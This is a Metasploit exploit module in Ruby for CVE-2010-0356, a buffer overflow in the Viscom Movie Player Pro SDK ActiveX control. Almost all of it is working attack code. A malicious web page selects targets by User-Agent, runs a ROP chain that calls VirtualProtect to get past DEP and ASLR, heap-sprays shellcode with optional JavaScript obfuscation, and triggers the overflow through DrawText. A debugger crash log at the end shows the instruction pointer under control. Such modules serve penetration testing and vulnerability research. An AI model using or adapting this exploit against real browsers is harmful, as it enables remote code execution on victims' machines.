##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Viscom Software Movie Player Pro SDK ActiveX 6.8',
			'Description'    => %q{
					Stack-based buffer overflow in the MOVIEPLAYER.MoviePlayerCtrl.1 ActiveX control
				in MoviePlayer.ocx 6.8.0.0 in Viscom Software Movie Player Pro SDK ActiveX 6.8 allows
				remote attackers to execute arbitrary code via a long strFontName parameter to the
				DrawText method.

				The victim will first be required to trust the publisher Viscom Software.
				This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7
				with Java support.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'shinnai', # Vulnerability discovery and original exploit
					'TecR0c',  # Metasploit module
					'mr_me'    # Metasploit module
				],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'CVE', '2010-0356' ],
					[ 'OSVDB', '61634' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/12320/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'false',
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[ 'Windows IE6-7', {} ],
					[ 'Windows IE8 + JAVA 6 (DEP & ASLR BYPASS)', {} ]
				],
			'DisclosureDate' => 'Jan 12 2010',
			'DefaultTarget'  => 0))

		register_options(
			[ OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true]) ], self.class)
	end

	# Prevent module from being executed in autopwn
	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("L")[0].to_i
	end

	def on_request_uri(cli, request)

		# Set target manually or automatically
		my_target = target
		if my_target.name == 'Automatic'
			agent = request.headers['User-Agent']
			if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
				my_target = targets[1] # XP
			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
				my_target = targets[1] # XP
			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8\.0/
				my_target = targets[2] # XP
			elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7\.0/
				my_target = targets[1] # Vista
			elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 8\.0/
				my_target = targets[2] # Vista
			elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8\.0/
				my_target = targets[2] # Win7
			end
		end

		sploit = rand_text_alpha(32)

		pivot_addr = 0x1126cfe4

		if my_target.name =~ /IE8/

			pivot_rop = 
			[ # Pivot to get to ROP Chain
				0x10015201, # POP EBP # RETN 08 [MOVIEP~1.OCX]
				pivot_addr,
				0x10014361, # MOV ESP,EBP # POP EBP # RETN 08    ** [MOVIEP~1.OCX]
				junk, # ---------------------^
				junk, # ----------------------^
				junk, # ----------------------^
				junk, # -------------------------------------^
				junk, # -------------------------------------^
				0x1001c049, # RETN (ROP NOP) [MOVIEP~1.OCX]
			].pack("V*")

			sploit << pivot_rop

			code = [0x7C347F98].pack("V") * 4 # RETN (ROP NOP) [MSVCR71.dll]

			code <<
			[ # MSVCR71.dll - rop chain generated with mona.py
				0x7C37653D, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
				0xFFFFFDFF, # Value to negate, will become 0x00000201 (dwSize)
				0x7C347F98, # RETN (ROP NOP)
				0x7C3415A2, # JMP [EAX]
				0xFFFFFFFF, #
				0x7C376402, # Skip 4 bytes
				0x7C351E05, # NEG EAX # RETN
				0x7C345255, # INC EBX # FPATAN # RETN
				0x7C352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
				0x7C344F87, # POP EDX # RETN
				0xFFFFFFC0, # Value to negate, will become 0x00000040
				0x7C351EB1, # NEG EDX # RETN
				0x7C34D201, # POP ECX # RETN
				0x7C38B001, # &Writable location
				0x7C347F97, # POP EAX # RETN
				0x7C37A151, # Ptr to &VirtualProtect() - 0x0EF
				0x7C378C81, # PUSHAD # ADD AL,0EF # RETN
				0x7C345C30, # Ptr to 'push esp' # ret
			].pack("V*")

			code << payload.encoded
		else
			code = payload.encoded
			sploit << [pivot_addr].pack('V*')
		end

		# Payload in JS format
		code = Rex::Text.to_unescape(code)

		spray = <<-JS
		var heap_lib = new heapLib.ie(0x20000);
		var code = unescape("#{code}");
		var nops = unescape("%u0c0c%u0c0c");

		while (nops.length < 0x2000) nops += nops;
		var offset = nops.substring(0, 0x800-0x20);
		var shellcode = offset + code + nops.substring(0, 0x2000-offset.length-code.length);

		while (shellcode.length < 0x40000) shellcode += shellcode;
		var block = shellcode.substring(0, (0x7fb00-6)/2);

		heap_lib.gc();

		for (var i = 0; i < 0x200; i++) {
		heap_lib.alloc(block);
		}
		JS

		# Use heaplib
		js = heaplib(spray)

		# Obfuscate on demand
		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		# Randomize the javascript variable names
		vname = rand_text_alpha(rand(100) + 1)
		strname = rand_text_alpha(rand(100) + 1)

		html = %Q|<html>
<object classid='clsid:F4A32EAF-F30D-466D-BEC8-F4ED86CAF84E' id='#{vname}'></object>
<script>#{js}</script>
<script language='vbscript'>

#{strname} = "#{sploit}"

#{vname}.DrawText 1, 1, 1, "", 1, #{strname}, True, True, True, 1, 1, 1, 1, 1, 1

</script>
</html>
|
		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, html)
	end

end
=begin
(78c.1d8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=000079f3 ebx=00000000 ecx=0203f298 edx=7c90e4f4 esi=008de5c0 edi=0287f2f4
eip=41414141 esp=0203f300 ebp=0203f4a0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???

0:005> dd @esp
0203f300  41414141 41414141 41414141 41414141
0203f310  41414141 41414141 41414141 41414141
0203f320  41414141 41414141 41414141 41414141
0203f330  41414141 41414141 41414141 41414141
0203f340  41414141 41414141 41414141 41414141
0203f350  41414141 41414141 41414141 41414141
0203f360  41414141 41414141 41414141 41414141
0203f370  41414141 41414141 41414141 41414141
=end
